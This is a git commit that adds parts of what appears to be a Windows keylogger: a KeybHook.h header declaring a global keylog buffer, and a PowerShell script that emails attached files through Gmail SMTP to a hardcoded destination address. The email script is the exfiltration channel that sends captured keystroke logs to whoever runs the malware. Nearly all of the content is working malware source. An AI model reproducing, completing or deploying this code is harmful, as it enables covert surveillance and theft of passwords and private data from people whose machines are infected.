e9be2a0662a7462c6959921905a76d023bbedae8
DominikT <dominiktyrala.prog@gmail.com>
2017-05-22 12:06:14 +0200

    Added SendMail.h + KeybHook.h

---
+++ KeybHook.h
@@ -0,0 +1,13 @@
+#ifndef KEYBHOOK_H
+#define KEYBHOOK_H
+
+#include <iostream>
+#include <fstream>
+#include "windows.h"
+#include "KeyConstants.h"
+#include "Timer.h"
+#include "SendMail.h"
+
+std::string keylog = "";
+
+#endif // KEYBHOOK_H
---
+++ PSScript.ps1
@@ -0,0 +1,79 @@
+﻿Param([String]$Att,
+      [String]$Subj,
+      [String]$Body
+      )
+
+Function Send-EMail
+{
+    Param(
+                [Parameter(`
+                Mandatory=$true)]
+            [String]$To,
+                [Parameter(`
+                Mandatory=$true)]
+            [String]$From,
+                [Parameter(`
+                Mandatory=$true)]
+            [String]$Password,
+                [Parameter(`
+                Mandatory=$true)]
+            [String]$Subject,
+                [Parameter(`
+                Mandatory=$true)]
+            [String]$Body,
+                [Parameter(`
+                Mandatory=$true)]
+            [String]$attachment
+            )
+
+    try{
+        $Msg = New-Object System.Net.Mail.MailMessage($From, $To, $Subject, $Body)
+        $Srv = "smtp.gmail.com"
+        if($attachment -ne $null)
+        {
+            try
+            {
+                $Attachments = $attachment -split("\:\:");
+
+                ForEach($val in $Attachments)
+                {
+                    $attch = New-Object System.Net.Mail.Attachment($val)
+                    $Msg.Attachments.Add($attch)
+                }
+            }
+            catch
+            {
+                exit 2;
+            }
+
+            $Client = New-Object System.Net.Mail.SmtpClient($Srv, 587)
+            $Client.EnableSsl = $true
+            $Client.Credentials = New-Object System.Net.NetworkCredential($From.Split("@")[0],$Password);
+            $Client.Send($Msg)
+            Remove-Variable -Name Client
+            Remove-Variable -Name Password
+            exit 7;
+        }
+    }
+    catch
+    {         
+        exit 3;
+    }
+
+}
+
+try
+{
+    Send-EMail
+        -attachment $Att
+        -To "our.dest@email.address"
+        -Body $Body
+        -Subject $Subj
+        -password "tralalala"
+        -From "Addres of sender"
+
+}
+catch
+{
+    exit 4;
+}
